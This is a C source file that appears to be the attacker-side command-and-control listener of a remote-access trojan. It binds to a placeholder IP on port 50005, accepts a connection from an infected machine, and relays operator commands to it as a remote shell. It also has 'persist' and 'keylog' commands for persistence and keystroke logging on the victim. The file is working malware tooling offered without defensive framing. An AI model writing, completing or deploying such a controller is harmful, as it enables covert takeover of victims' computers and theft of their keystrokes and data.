#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h> 



int main(int argc, char const *argv[])
{
	
	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_address, client_address;
	int i =0;
	int optval =1;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) <0){
		printf("[*] Error Setting TCP Socket Options \n");
		return 1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr =inet_addr("$ip"); //change ip here 
	server_address.sin_port = htons(50005);

	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
	listen(sock, 10);
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);


	while(1){
		jump:
		bzero(buffer, 1024);
		bzero(response, sizeof(response));
		printf("[*] Shell #%s~:\n",inet_ntoa(client_address.sin_addr));
		fgets(buffer, sizeof(buffer),stdin);
		strtok(buffer,"\n");
		write(client_socket,buffer, sizeof(buffer));
		if (strncmp("q", buffer, 1) == 0){
			break;
		}
		else if (strncmp("cd ", buffer, 3) ==0){
			goto jump;
		}
		else if (strncmp("persist", buffer, 7) ==0){
			recv(client_socket, response, sizeof(response), 0);
			printf("%s", response);
			goto jump;
		}
		else if (strncmp("keylog", buffer, 6) ==0){
			goto jump;
		}
		else{
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
	}

	return 0;
}